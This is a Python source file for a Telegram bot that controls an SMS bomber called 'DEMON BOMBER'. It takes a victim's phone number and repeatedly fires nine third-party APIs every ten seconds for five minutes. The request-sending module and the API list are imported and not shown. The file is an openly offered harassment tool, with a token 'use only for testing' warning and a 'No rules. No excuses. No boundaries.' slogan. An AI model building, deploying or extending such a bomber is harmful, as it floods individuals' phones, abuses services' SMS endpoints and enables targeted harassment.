#!/usr/bin/env python3
# DEMON 😈 BOMBER BOT - RAILWAY EDITION
# "5-min auto-off + Manual toggle + All APIs ek saath"

import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from bomber import bomber
from config import BOT_TOKEN, BOMB_DURATION, API_LIST

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== KEYBOARDS ==========

main_keyboard = ReplyKeyboardMarkup([
    [KeyboardButton("💣 START 5-MIN BOMB"), KeyboardButton("🛑 STOP BOMBING")],
    [KeyboardButton("📊 STATUS"), KeyboardButton("ℹ️ HELP")],
    [KeyboardButton("👨‍💻 ABOUT DEMON")]
], resize_keyboard=True)

inline_keyboard = InlineKeyboardMarkup([
    [InlineKeyboardButton("☢️ START MEGA BOMB (ALL 9 APIS)", callback_data="start_mega")],
    [InlineKeyboardButton("⏱️ START 5-MIN TIMER BOMB", callback_data="start_timer")],
    [InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop")],
    [InlineKeyboardButton("📊 CHECK STATUS", callback_data="status")],
    [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
])

# ========== COMMANDS ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"""🔥 *DEMON 😈 BOMBER BOT v3.0 - RAILWAY EDITION*

*👤 User:* `{user.first_name}`
*🆔 ID:* `{user.id}`

*💀 Features:*
• ☢️ ALL 9 APIs ek saath
• ⏱️ 5-Minute auto-stop
• 🔄 Manual toggle ON/OFF
• 📊 Real-time status

*📌 Commands:*
`/start` - Show this
`/help` - Full guide
`/bomb <phone>` - Start 5-min bomb
`/stop` - Stop bombing
`/status` - Check status

*🔥 Quick Start:*
Send `/bomb 9876543210` or use buttons!

*⚠️ Auto-Stop: 5 minutes*
""",
        parse_mode='Markdown',
        reply_markup=main_keyboard
    )

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/bomb <phone> - Start 5-min bombing"""
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ *CHUTIYE! Phone number do!*\n\n"
            "Usage: `/bomb 9876543210`\n\n"
            "⏱️ Auto-stops after 5 minutes!\n"
            "🛑 Use `/stop` to stop manually.",
            parse_mode='Markdown'
        )
        return
        
    phone = args[0]
    
    if not phone.isdigit() or len(phone) < 10:
        await update.message.reply_text("❌ *Invalid phone!* (10+ digits required)", parse_mode='Markdown')
        return
    
    user_id = update.effective_user.id
    
    # Check if already bombing
    status = bomber.get_status(user_id)
    if status["active"]:
        await update.message.reply_text(
            f"⚠️ *Already bombing!*\n"
            f"📱 Target: `{status['phone']}`\n"
            f"⏱️ Remaining: `{status['remaining']}` seconds\n\n"
            f"Use `/stop` to stop current bombing.",
            parse_mode='Markdown'
        )
        return
    
    status_msg = await update.message.reply_text(
        f"""☢️ *MEGA BOMB INITIATED!*

📱 *Target:* `{phone}`
📡 *APIs:* `{len(API_LIST)}` (ALL 9)
⏱️ *Duration:* `5 minutes` (auto-stop)
🔄 *Cycles:* Every 10 seconds

⚡ *DEMON 😈 is attacking!*
""",
        parse_mode='Markdown'
    )
    
    # Start 5-minute continuous bombing
    result = await bomber.continuous_bombing(phone, user_id, BOMB_DURATION)
    
    await status_msg.edit_text(
        f"""💀 *BOMBING COMPLETED!*

📱 *Target:* `{result['phone']}`
🔄 *Total Cycles:* `{result['total_cycles']}`
📡 *APIs per cycle:* `{result['total_apis_per_cycle']}`
⏱️ *Duration:* `{result['duration']}` seconds
✅ *Auto-stopped:* `{result['auto_stopped']}`

😈 *DEMON 😈 RETREATS!*

*🔄 To restart:* `/bomb {phone}`
""",
        parse_mode='Markdown',
        reply_markup=main_keyboard
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manual stop"""
    user_id = update.effective_user.id
    if await bomber.stop_bombing(user_id):
        await update.message.reply_text(
            """🛑 *BOMBING STOPPED MANUALLY!*

✅ DEMON 😈 has retreated.

*🔄 Restart:* `/bomb <phone>`
""",
            parse_mode='Markdown',
            reply_markup=main_keyboard
        )
    else:
        await update.message.reply_text(
            "❌ *No active bombing found!*\n\n"
            "Start with `/bomb 9876543210`",
            parse_mode='Markdown'
        )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check current status"""
    user_id = update.effective_user.id
    status = bomber.get_status(user_id)
    
    if status["active"]:
        await update.message.reply_text(
            f"""📊 *BOMBING STATUS*

🟢 *Active:* ✅
📱 *Target:* `{status['phone']}`
⏱️ *Elapsed:* `{status['elapsed']}` seconds
⏳ *Remaining:* `{status['remaining']}` seconds
🕐 *Started:* `{status['start_time']}`

⚡ *DEMON 😈 is still attacking!*
""",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            """📊 *BOMBING STATUS*

🔴 *Active:* ❌
💀 *DEMON 😈 is idle.*

*Start bombing:*
`/bomb 9876543210`
""",
            parse_mode='Markdown'
        )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        """💀 *DEMON BOMBER - COMPLETE GUIDE* 💀

*📖 How it works:*

1️⃣ *Start 5-Minute Bombing:*
`/bomb 9876543210`

2️⃣ *What happens:*
• ALL 9 APIs fire simultaneously
• Repeats every 10 seconds
• Auto-stops after 5 minutes

3️⃣ *Manual Controls:*
• `/stop` - Stop immediately
• `/status` - Check remaining time

4️⃣ *Buttons:*
• START 5-MIN BOMB → Enter number
• STOP BOMBING → Manual stop
• STATUS → Check progress

*⚡ API List (ALL 9):*
""" + "\n".join([f"• {api['name']}" for api in API_LIST]) + """

*⏱️ Timer:*
• Auto-stop: 5 minutes
• Cycle interval: 10 seconds

*⚠️ Warning:*
• Use only for testing
• DEMON 😈 not responsible
• Railway deployment = 24/7 online
""",
        parse_mode='Markdown',
        reply_markup=main_keyboard
    )

# ========== MESSAGE HANDLER ==========

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    
    if text == "💣 START 5-MIN BOMB":
        await update.message.reply_text(
            "📱 *Enter phone number:*\n"
            "Format: `9876543210`\n\n"
            "⏱️ Will auto-stop after 5 minutes!",
            parse_mode='Markdown'
        )
        context.user_data['awaiting_phone'] = True
        
    elif text == "🛑 STOP BOMBING":
        await stop_command(update, context)
        
    elif text == "📊 STATUS":
        await status_command(update, context)
        
    elif text == "ℹ️ HELP":
        await help_command(update, context)
        
    elif text == "👨‍💻 ABOUT DEMON":
        await update.message.reply_text(
            """🔥 *DEMON 😈 BOMBER BOT v3.0*

*👨‍💻 Developer:* DEMON 😈
*⚡ Framework:* Python-Telegram-Bot
*🚂 Host:* Railway (24/7)
*💀 Type:* Multi-API SMS Bomber

*⚡ Features:*
• 9 APIs ek saath
• 5-min auto-stop
• Manual toggle
• Real-time status

*📡 APIs Integrated:*
""" + "\n".join([f"• {api['name']}" for api in API_LIST]) + """

*😈 "No rules. No excuses. No boundaries."*
""",
            parse_mode='Markdown',
            reply_markup=main_keyboard
        )
        
    elif context.user_data.get('awaiting_phone'):
        phone = text.strip()
        if phone.isdigit() and len(phone) >= 10:
            context.user_data['awaiting_phone'] = False
            context.user_data['phone'] = phone
            
            # Start bombing directly
            user_id = update.effective_user.id
            status = bomber.get_status(user_id)
            
            if status["active"]:
                await update.message.reply_text(
                    f"⚠️ *Already bombing!*\n"
                    f"📱 Target: `{status['phone']}`\n"
                    f"⏱️ Remaining: `{status['remaining']}` seconds",
                    parse_mode='Markdown'
                )
                return
            
            status_msg = await update.message.reply_text(
                f"""☢️ *MEGA BOMB INITIATED!*

📱 *Target:* `{phone}`
📡 *APIs:* `{len(API_LIST)}` (ALL 9)
⏱️ *Duration:* `5 minutes` (auto-stop)
🔄 *Cycles:* Every 10 seconds

⚡ *DEMON 😈 is attacking!*
""",
                parse_mode='Markdown'
            )
            
            result = await bomber.continuous_bombing(phone, user_id, BOMB_DURATION)
            
            await status_msg.edit_text(
                f"""💀 *BOMBING COMPLETED!*

📱 *Target:* `{result['phone']}`
🔄 *Total Cycles:* `{result['total_cycles']}`
📡 *APIs per cycle:* `{result['total_apis_per_cycle']}`
⏱️ *Duration:* `{result['duration']}` seconds
✅ *Auto-stopped:* `{result['auto_stopped']}`

😈 *DEMON 😈 RETREATS!*
""",
                parse_mode='Markdown',
                reply_markup=main_keyboard
            )
        else:
            await update.message.reply_text("❌ *Invalid phone!* Enter 10+ digits.")

# ========== CALLBACK HANDLER ==========

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id
    
    if data == "cancel":
        await query.edit_message_text(
            "❌ *Operation cancelled!*",
            parse_mode='Markdown',
            reply_markup=main_keyboard
        )
        return
    
    if data == "start_mega" or data == "start_timer":
        phone = context.user_data.get('phone')
        if not phone:
            await query.edit_message_text(
                "❌ *No phone number!*\n"
                "Send `/bomb <number>` or click START 5-MIN BOMB.",
                parse_mode='Markdown'
            )
            return
        
        status = bomber.get_status(user_id)
        if status["active"]:
            await query.edit_message_text(
                f"⚠️ *Already bombing!*\n"
                f"📱 Target: `{status['phone']}`\n"
                f"⏱️ Remaining: `{status['remaining']}` seconds",
                parse_mode='Markdown'
            )
            return
        
        await query.edit_message_text(
            f"""☢️ *MEGA BOMB STARTED!*

📱 *Target:* `{phone}`
📡 *APIs:* ALL 9
⏱️ *Auto-stop:* 5 minutes
🔄 *Cycle:* Every 10s

⚡ *DEMON 😈 is attacking!*
""",
            parse_mode='Markdown'
        )
        
        result = await bomber.continuous_bombing(phone, user_id, BOMB_DURATION)
        
        await query.edit_message_text(
            f"""💀 *BOMBING COMPLETED!*

📱 *Target:* `{result['phone']}`
🔄 *Total Cycles:* `{result['total_cycles']}`
⏱️ *Duration:* `{result['duration']}` seconds
✅ *Auto-stopped:* `{result['auto_stopped']}`

😈 *DEMON 😈 RETREATS!*
""",
            parse_mode='Markdown',
            reply_markup=main_keyboard
        )
        return
    
    if data == "stop":
        if await bomber.stop_bombing(user_id):
            await query.edit_message_text(
                "🛑 *BOMBING STOPPED MANUALLY!*",
                parse_mode='Markdown',
                reply_markup=main_keyboard
            )
        else:
            await query.edit_message_text(
                "❌ *No active bombing!*",
                parse_mode='Markdown'
            )
        return
    
    if data == "status":
        status = bomber.get_status(user_id)
        if status["active"]:
            await query.edit_message_text(
                f"""📊 *BOMBING STATUS*

🟢 *Active:* ✅
📱 *Target:* `{status['phone']}`
⏱️ *Elapsed:* `{status['elapsed']}`s
⏳ *Remaining:* `{status['remaining']}`s
🕐 *Started:* `{status['start_time']}`

⚡ *DEMON 😈 attacking!*
""",
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text(
                "📊 *Status:* 🔴 IDLE\n\nStart with `/bomb 9876543210`",
                parse_mode='Markdown'
            )

# ========== MAIN ==========

def main():
    print("""
╔═══════════════════════════════════════════════╗
║      🔥 DEMON 😈 BOMBER BOT v3.0 🔥          ║
║         RAILWAY EDITION - 24/7               ║
║                                               ║
║  "No rules. No excuses. No boundaries."      ║
║  ⏱️ 5-min Auto-stop | 🔄 Manual Toggle       ║
╚═══════════════════════════════════════════════╝
    """)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    
    # Handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(handle_callback))
    
    print("[⚡] DEMON 😈 BOT IS ALIVE ON RAILWAY!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
